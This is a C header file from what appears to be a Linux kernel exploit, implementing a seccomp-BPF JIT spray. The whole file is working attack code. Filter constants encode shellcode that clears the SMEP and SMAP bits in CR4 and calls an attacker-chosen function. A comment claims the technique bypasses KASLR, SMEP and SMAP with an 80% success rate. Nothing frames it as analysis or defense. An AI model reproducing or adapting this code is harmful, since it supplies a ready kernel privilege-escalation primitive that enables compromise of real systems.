#ifndef _JITSPRAY_H
#define _JITSPRAY_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <signal.h>
#include "common.h"

#define SECCOMP_MODE_FILTER    2


static void __create_jit(void) {
    const int N = 0xfc0;
    u64 *filter = (u64*)calloc(N, 8);
    struct prog {
        u16 len;
        u64 *filter;
    } rule = {
        .len = N,
        .filter = filter
    };

    // Fill our filter with a nop sled
    for (int i = 0; i < N; i++) {
        filter[i] = 0xa8909090UL << 32;  // nop; nop; nop; test al, XX;
    }

    filter[N - 8] = 0xa8e7200fUL << 32;  // mov rdi, cr4;
    filter[N - 7] = 0xa85e036aUL << 32;  // push 3; pop rsi;
    filter[N - 6] = 0xa814e6c1UL << 32;  // shl esi, 20;
    filter[N - 5] = 0xa8d6f7adUL << 32;  // lods; not esi;
    filter[N - 4] = 0xa890f721UL << 32;  // and edi, esi; nop;
    filter[N - 3] = 0xa8e7220fUL << 32;  // mov cr4, rdi;
    filter[N - 2] = 0xa8c3d0ffUL << 32;  // call rax; ret;
    filter[N - 1] = 0x7fff000000000006;  // RETURN ALLOW

    
    /* JIT our filter */
    fork();
    fork();
    fork();
    fork();
    fork();
    // 32x
    // 0x1000*5 * 8 * 32 > 4 MB
    for (int i = 0; i < 8; i++) {
        if(prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &rule) < 0)
            perror("prctl(PR_SET_SECCOMP)");
    }
    pause();
}

/*
Bypass KASLR, SMEP and SMAP with 80% success rate.
Returns the address to jump to for ease of use. It's always the same.
*/
void *jit_spray(void (*target)()) {

    if (fork() == 0) {
        SYSCHK(prctl(PR_SET_PDEATHSIG, SIGTERM));
        SYSCHK(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0));
        __create_jit();
        _exit(0);
    }
    // Create address
    u64* a = mmap((void*)(3<<20), 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
    a[0] = (u64)target;
    sched_yield();
    return (void*)0xffffffffc0400000;
}

#endif /* _JITSPRAY_H */
